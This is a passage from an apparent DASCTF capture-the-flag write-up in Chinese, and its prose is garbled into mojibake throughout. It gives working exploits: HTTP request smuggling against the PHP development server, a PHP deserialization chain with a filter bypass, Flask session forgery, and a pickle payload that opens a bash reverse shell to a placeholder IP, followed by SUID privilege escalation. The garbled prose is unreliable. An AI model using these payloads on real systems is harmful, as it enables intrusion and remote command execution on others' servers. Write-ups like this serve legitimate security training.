class="number">0x974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">x = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;0e287wQ\x08R\x17\x00FGXYFZ\x07V\x03kIUCn\x02VDg\x01f\x0cN&#x27;</span></span><br></pre></td></tr></table></figure><p>ç»“åˆå‹ç¼©åŒ…æ³¨é‡Šï¼Œå°†ç»“æœä¸å‹ç¼©åŒ…å¯†ç <code>C0ngr4tulati0n5_y0u_fou^d_m3</code> é«˜ä½è¡¥ <code>\x00</code>ï¼Œ</p><p>å³å¯¹é½å¼‚æˆ–å¾—flagï¼š<code>DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="D0nâ€™t-pl4y-g4m3-FIX"><a href="#D0nâ€™t-pl4y-g4m3-FIX" class="headerlink" title="D0nâ€™t pl4y g4m3!!! -FIX"></a>D0nâ€™t pl4y g4m3!!! -FIX</h3><blockquote><p>å°æ˜ä¸å°å¿ƒæ²‰è¿·âšªâšªçš„ä¸œè¥¿æŠŠæºç å’ŒçŒ«çŒ«æä¸¢äº†ï¼Œè¯·å¸®ä»–æ‰¾å›æ¥ã€‚è¯·è®¿é—®/p0p.php</p></blockquote><p>bpè®¿é—® <code>/p0p.php</code>ï¼Œæç¤ºï¼š<code># ./æœ‰hint.zip</code>ï¼Œ</p><p>è®¿é—® <code>hint.zip</code> ï¼Œ<a href="https://zdjd.vercel.app/">åœ¨çº¿å°Šå˜Ÿå‡å˜Ÿè§£ç </a>ï¼Œå¾— <code>flagåœ¨/tmp/catcatf1ag.txt</code>ã€‚</p><p>æŸ¥çœ‹é¦–é¡µå‘ç°ä½¿ç”¨äº†PHP Development Serverï¼Œå½“PHP&lt;=7.4.21æ—¶Development Serverå­˜åœ¨æºç æ³„éœ²æ¼æ´ï¼ˆCNVD-2023-05738ï¼‰ï¼Œè¯¥æ¼æ´æºäºphp cli server begin send staticåœ¨è§£æhttpè¯·æ±‚æ—¶å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´å°†ä¸¤ä¸ªè¯·æ±‚æ‹¼æ¥è‡³ä¸€ä¸ªhttpè¯·æ±‚ä¸­å¯¼è‡´æœåŠ¡å™¨å°†phpæ–‡ä»¶ä½œä¸ºé™æ€æ–‡ä»¶è¿”å›ã€‚</p><p>æ„é€ è¯·æ±‚èµ°ç§ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/p0p.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>tcp.cloud.dasctf.com:20294</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"></span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° <code>p0p.php</code> çš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># ./æœ‰hint.zip</span></span><br></pre></td></tr></table></figure><p>åˆ†ææ„é€ ååºåˆ—åŒ–é“¾ï¼Œç”± <code>Bei:__destruct()</code> å¼€å§‹ï¼Œè°ƒç”¨åˆ° <code>Yang:__call()</code> ä¸­çš„ <code>call_user_func()</code> å‡½æ•°RCEï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=Yang()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=Yang()</span><br><span class="line">    public_now=&#123;<span class="string">&#x27;YCB1&#x27;</span>:<span class="string">&#x27;system&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bei</span>:</span><br><span class="line">    public_CTF=Yang()</span><br><span class="line">    public_fine=Yang()</span><br><span class="line">    public_rce=<span class="string">&#x27;cat /tmp/catcatf1ag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(Bei()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>åŒå†™systemç»•è¿‡å…³é”®è¯è¿‡æ»¤ï¼ŒPOSTä¼ å‚ï¼š</p><p><code>CTF=O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125;</code></p><p>å¾—åˆ°flagï¼š<code>DASCTF&#123;54675642781313253235583695043371&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h3><blockquote><p> I have been endeavoring to Reduce my phobia of Serpents by learning more about them. Do not scan, note that there is a www.zip file under the website.</p></blockquote><p>å°è¯•è§£flask sessionï¼š</p><p><code>flask-unsign --decode --cookie &#39;eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjAsIm5hbWUiOiJHV0hUIiwic2VjcmV0X2tleSI6IkdXSFR4Y3VMeGhWZVFBIn19.ZPLWRw.5YHps4KX1FfZNY5xe9-25Nckl7s&#39;</code></p><p>å¾—ï¼š<code>&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 0, &#39;name&#39;: &#39;GWHT&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;</code></p><p>åŒ…å«secret_keyï¼Œä¿®æ”¹ä¸ºï¼š<code>&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;</code>ï¼ŒåŠ å¯†åæ”¹cookieï¼š</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;&quot; --secret &#39;GWHTxcuLxhVeQA&#39;</code></p><p>å¾—åˆ°æç¤ºï¼š<code>Hello admin, welcome to /ppppppppppick1e</code>ã€‚</p><p>è®¿é—® <code>ppppppppppick1e</code> è·¯ç”±ï¼Œåœ¨Headerå‘ç°ï¼š<code>Hint: Source in /src0de</code>ï¼Œå¾—åˆ°æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>pythonååºåˆ—åŒ–ï¼Œæµ‹è¯•å‘ç°ç¦ç”¨RæŒ‡ä»¤ï¼Œå‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/89132768">è¿™é‡Œ</a>ä½¿ç”¨ä¸å¸¦RæŒ‡ä»¤çš„RCE payloadï¼š</p><p><code>b&#39;\x80\x03c__main__\nGWHT\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVbash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;\nb.&#39;</code></p><p>base64ç¼–ç åç»™cookieä¸­çš„ <code>pick1e</code> èµ‹å€¼ï¼ŒæˆåŠŸåå¼¹shellã€‚</p><p>è¯»æ ¹ç›®å½•ä¸‹flagå‘ç°æ— æƒé™ï¼ŒæŸ¥çœ‹SUIDå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>ï¼Œ</p><p>å‘ç° <code>/usr/bin/python3.8</code>ï¼Œæ‰§è¡Œ <code>python3.8 -c &quot;print(open(&#39;/flag&#39;).read())&quot;</code> è¯»åˆ°flagï¼š<code>DASCTF&#123;62339708167284198788958643730094&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h3><blockquote><p>Fantasy world full of magic and dreamâ€¦â€¦â€¦â€¦â€¦.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>éé¢„æœŸï¼Œåˆ©ç”¨ <code>read</code> è·¯ç”±è¯»ç¯å¢ƒå˜é‡æ–‡ä»¶ <code>/proc/1/environ</code> æ–‡ä»¶æ‰¾åˆ°flagï¼š<code>/read?file=/proc/1/environ</code>ã€‚</p><p><code>DASFLAG=DASCTF&#123;67528847472042710457227886304140&#125;</code></p><p>é¢„æœŸè§£åº”è¯¥æ˜¯åˆ†åˆ«é€šè¿‡ <code>/proc/self/maps</code> å’Œ <code>/proc/self/mem</code> è¯»å–å †æ ˆåˆ†å¸ƒå’Œå¯¹åº”ä½ç½®å†…å­˜æ•°æ®æ‹¿åˆ°SECRET_KEYå€¼ï¼Œå†ä¿®æ”¹flask sessionç»•é»‘åå•RCEã€‚</p><p>â€‹    </p><h3 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h3><blockquote><p>ç®€å•å¾—yaml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">import</span> 